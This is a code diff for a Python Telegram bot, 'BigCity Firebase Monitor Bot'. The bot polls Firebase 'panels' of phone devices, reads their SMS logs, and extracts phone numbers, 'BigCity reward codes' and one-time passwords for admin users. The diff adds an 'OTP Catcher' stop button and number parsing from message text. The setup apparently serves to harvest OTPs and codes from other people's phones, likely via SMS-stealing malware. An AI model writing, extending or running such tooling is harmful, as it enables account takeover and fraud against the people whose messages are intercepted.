@@ -1,5 +1,5 @@
 """
-BigCity Firebase Monitor Bot (Premium + Fixes)
+BigCity Firebase Monitor Bot (Final Premium)
 """
 import asyncio
 import json
@@ -120,16 +120,12 @@ def is_device_id(k: str) -> bool:
         return False
     return 6 <= len(k) <= 60
 
-# ─── STRONGER DISCOVERY ──────────────────────────────────────────────────────
 async def discover_structure(client, base):
-    # 1. Check root structure
     root, _ = await api_get(client, f"{base}/.json?shallow=true", 10)
     if not isinstance(root, dict):
         return None, None
         
     keys = list(root.keys())
-    
-    # Look for known sub-nodes first
     for c in ("clients", "devices", "users", "all_devices", "nodes"):
         if c in keys:
             sub, _ = await api_get(client, f"{base}/{c}.json?shallow=true", 10)
@@ -141,7 +137,6 @@ async def discover_structure(client, base):
                         break
                 return c, msg
 
-    # If no known nodes found, check if devices are directly at root
     if any(is_device_id(k) for k in keys):
         msg = ""
         for c in ("messages", "sms", "logs"):
@@ -149,14 +144,10 @@ async def discover_structure(client, base):
                 msg = c
                 break
         return "", msg
-
     return None, None
 
-# ─── ONLINE CHECK (RELAXED) ──────────────────────────────────────────────────
 def device_is_online(d: dict) -> bool:
     if not isinstance(d, dict): return False
-    
-    # Check direct boolean/string flags
     for f in ("online", "isOnline", "active", "connected", "status", "state"):
         if f in d:
             v = str(d[f]).lower()
@@ -164,8 +155,6 @@ def device_is_online(d: dict) -> bool:
                 return True
             if v in ("false", "offline", "0", "no", "inactive"):
                 return False
-
-    # Check timestamps (lastSeen / lastActive)
     now = time.time() * 1000
     for f in ("lastSeen", "lastActive", "last_seen", "last_active", "timestamp", "updatedAt", "time"):
         if f in d:
@@ -176,20 +165,40 @@ def device_is_online(d: dict) -> bool:
             elif isinstance(v, str) and v.isdigit():
                 n = int(v)
                 ts = n if n > 1e12 else n * 1000
-            if ts and (now - ts) < 10 * 60 * 1000: # 10 minutes
+            if ts and (now - ts) < 10 * 60 * 1000:
                 return True
-
-    # Fallback: if we can't find any status, assume online if it has messages
-    # (This ensures we don't miss devices on unknown structures)
     return False
 
+# ─── NUMBER EXTRACTOR (FIXED - NO SENDER FALLBACK) ───────────────────────────
 def _extract_number(d: dict) -> str:
-    for f in ("number","phoneNumber","phone","fromNumber","sim_number","to","mobile"):
-        if f in d and d[f]: return str(d[f])
-    for n in ("webhookEvent","info","details"):
-        if n in d and isinstance(d[n], dict):
-            x = _extract_number(d[n])
-            if x: return x
+    """Device JSON ke andar se phone number nikalta hai."""
+    if not isinstance(d, dict):
+        return ""
+
+    # 1. Check direct known fields
+    for f in ("number", "phoneNumber", "phone", "fromNumber", "sim_number", "to", "mobile"):
+        if f in d and d[f]:
+            val = str(d[f]).strip()
+            clean_val = re.sub(r'\D', '', val)
+            if len(clean_val) >= 7 and len(clean_val) <= 15:
+                return val
+
+    # 2. Deep search inside nested folders (webhookEvent, info, etc.)
+    for k, v in d.items():
+        if isinstance(v, dict):
+            res = _extract_number(v)
+            if res:
+                return res
+
+    return ""
+
+def _extract_number_from_msg(text: str) -> str:
+    """Message ke text ke andar se 10-digit mobile number nikalta hai."""
+    if not text: return ""
+    # Find 10 to 12 digit numbers (Indian mobile numbers)
+    matches = re.findall(r'\b(?:\+?91[\-\s]?)?([6-9]\d{9})\b', text)
+    if matches:
+        return matches[0]
     return ""
 
 async def fetch_online_devices(client, base, dev_node):
@@ -200,8 +209,7 @@ async def fetch_online_devices(client, base, dev_node):
     out = []
     for did, dd in data.items():
         if not is_device_id(did) or not isinstance(dd, dict): continue
-        # Strictly checking online, but if structure is weird, let it pass if it has a number
-        if device_is_online(dd) or _extract_number(dd):
+        if device_is_online(dd):
             out.append((did, _extract_number(dd)))
     return out
 
@@ -242,8 +250,6 @@ def fmt_reward(panel, did, num, sender, dt, code, msg, token):
     btn = InlineKeyboardMarkup([[
         InlineKeyboardButton("🎯 OTP Catcher (5 min)", callback_data=f"otp|{token}")
     ]])
-    
-    # Tap to copy format (<code>) aur bold text (<b>)
     txt = (
         "🎉 <b>BIGCITY REWARD CODE FOUND</b> 🎉\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -261,7 +267,6 @@ def fmt_reward(panel, did, num, sender, dt, code, msg, token):
     return txt, btn
 
 def fmt_otp(panel, did, num, sender, dt, otp, msg):
-    # Tap to copy format (<code>) aur bold text (<b>)
     return (
         "🔐 <b>BIGCITY OTP RECEIVED</b> 🔐\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -301,9 +306,13 @@ async def process_device(client, pk, pc, did, num, state, admins, app, is_new_pa
             if not kind:
                 state[key] = True; continue
             sender, dt = extract_sender_time(md)
+            
+            # Number from device OR from message text (NO SENDER FALLBACK)
+            actual_num = num or _extract_number_from_msg(text)
+            
             if kind == "reward":
                 token = f"{pk}~{did}~{int(time.time())}"
-                txt, btn = fmt_reward(panel, did, num, sender, dt, payload, text, token)
+                txt, btn = fmt_reward(panel, did, actual_num, sender, dt, payload, text, token)
                 for uid in admins:
                     try:
                         await asyncio.wait_for(
@@ -383,7 +392,7 @@ async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"monitor outer: {e}")
 
-# ─── OTP CATCHER ─────────────────────────────────────────────────────────────
+# ─── OTP CATCHER (WITH STOP BUTTON) ──────────────────────────────────────────
 
 async def otp_catcher_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
@@ -405,6 +414,26 @@ async def otp_catcher_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"otp_cb: {e}")
 
+async def stop_otp_watch_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    try:
+        if not is_admin(q.from_user.id): 
+            return await q.answer("❌ Admin Only!", show_alert=True)
+        if not q.data.startswith("stop_otp|"): return
+        did = q.data.split("|",1)[1]
+        
+        task_name = f"otp_watch_{did}"
+        if hasattr(context.application, 'running_tasks') and task_name in context.application.running_tasks:
+            context.application.running_tasks[task_name].cancel()
+            
+        await q.answer("🛑 OTP Watch Stopped!", show_alert=True)
+        try: 
+            await q.edit_message_reply_markup(reply_markup=None)
+            await q.edit_message_text(f"🛑 <b>OTP Watch manually stopped</b> for <code>{did}</code>.", parse_mode="HTML")
+        except Exception: pass
+    except Exception as e:
+        logger.error(f"stop_otp_cb: {e}")
+
 async def otp_watch(app, chat_id, pk, did):
     try:
         panels = load_panels()
@@ -415,16 +444,23 @@ async def otp_watch(app, chat_id, pk, did):
         panel = pc.get("name","Panel")
         end_at = time.time() + OTP_WATCH_SECONDS
         seen = set()
+        
+        stop_btn = InlineKeyboardMarkup([[
+            InlineKeyboardButton("🛑 Stop OTP Watch", callback_data=f"stop_otp|{did}")
+        ]])
+        
         async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
             first = await fetch_last_messages(client, base, msg_node, did, limit=10)
             for mk, md in first.items():
                 if isinstance(md, dict):
                     seen.add(str(md.get("id", mk)))
-            await app.bot.send_message(
+            
+            watch_msg = await app.bot.send_message(
                 chat_id,
-                f"🎯 <b>OTP Catcher active</b> — <code>{did}</code>\nMax 5 min, sirf naya OTP.",
-                parse_mode="HTML"
+                f"🎯 <b>OTP Catcher active</b> — <code>{did}</code>\nMax 5 min, sirf naya OTP.\n<i>(Manually band karne ke liye niche button dabayein)</i>",
+                parse_mode="HTML", reply_markup=stop_btn
             )
+            
             last_ping = time.time()
             while time.time() < end_at:
                 try:
@@ -441,16 +477,24 @@ async def otp_watch(app, chat_id, pk, did):
                         kind, payload = classify_bigcity(text)
                         if kind != "otp": continue
                         sender, dt = extract_sender_time(md)
+                        
                         num = ""
                         try:
                             path = f"/{pc.get('device_node','')}" if pc.get("device_node") else ""
                             dd, _ = await api_get(client, f"{base}{path}/{did}.json", 6)
                             if isinstance(dd, dict): num = _extract_number(dd)
                         except Exception: pass
+                        
+                        # Number from device OR from message text (NO SENDER FALLBACK)
+                        actual_num = num or _extract_number_from_msg(text)
+                        
                         await app.bot.send_message(
-                            chat_id, fmt_otp(panel, did, num, sender, dt, payload, text),
+                            chat_id, fmt_otp(panel, did, actual_num, sender, dt, payload, text),
                             parse_mode="HTML", disable_web_page_preview=True,
                         )
+                        try: await watch_msg.edit_reply_markup(reply_markup=None)
+                        except Exception: pass
+                        
                         await app.bot.send_message(
                             chat_id, f"✅ <b>OTP aaya — watch band</b> (<code>{did}</code>).",
                             parse_mode="HTML"
@@ -467,9 +511,14 @@ async def otp_watch(app, chat_id, pk, did):
                         )
                     except Exception: pass
                 await asyncio.sleep(8)
+                
+            try: await watch_msg.edit_reply_markup(reply_markup=None)
+            except Exception: pass
             await app.bot.send_message(
                 chat_id, f"⌛ <b>OTP watch timeout</b> (<code>{did}</code>).", parse_mode="HTML"
             )
+    except asyncio.CancelledError:
+        await app.bot.send_message(chat_id, f"🛑 <b>OTP Watch manually stopped</b> for <code>{did}</code>.", parse_mode="HTML")
     except Exception as e:
         logger.error(f"otp_watch outer: {e}")
 
@@ -651,7 +700,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             panels = load_panels()
             removed_count = 0
             
-            # Split by comma or space
             raw_nums = re.split(r'[,\s]+', text)
             idxs = []
             for n in raw_nums:
@@ -660,7 +708,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     if 0 <= idx < len(pl):
                         idxs.append(idx)
             
-            # Remove from lowest to highest so indices don't shift
             for idx in sorted(set(idxs), reverse=True):
                 rm = panels.pop(pl[idx], None)
                 if rm:
@@ -691,7 +738,10 @@ async def main():
     app.add_handler(MessageHandler(filters.Regex(r"^(➕ Add Panel|Add Panel)$"), add_panel_command))
     app.add_handler(MessageHandler(filters.Regex(r"^(❌ Remove Panel|Remove Panel)$"), remove_panel_command))
     app.add_handler(MessageHandler(filters.Regex(r"^(👑 Admin Panel|Admin Panel)$"), admin_panel_command))
+    
     app.add_handler(CallbackQueryHandler(otp_catcher_cb, pattern=r"^otp\|"))
+    app.add_handler(CallbackQueryHandler(stop_otp_watch_cb, pattern=r"^stop_otp\|"))
+    
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     
     app.job_queue.run_repeating(
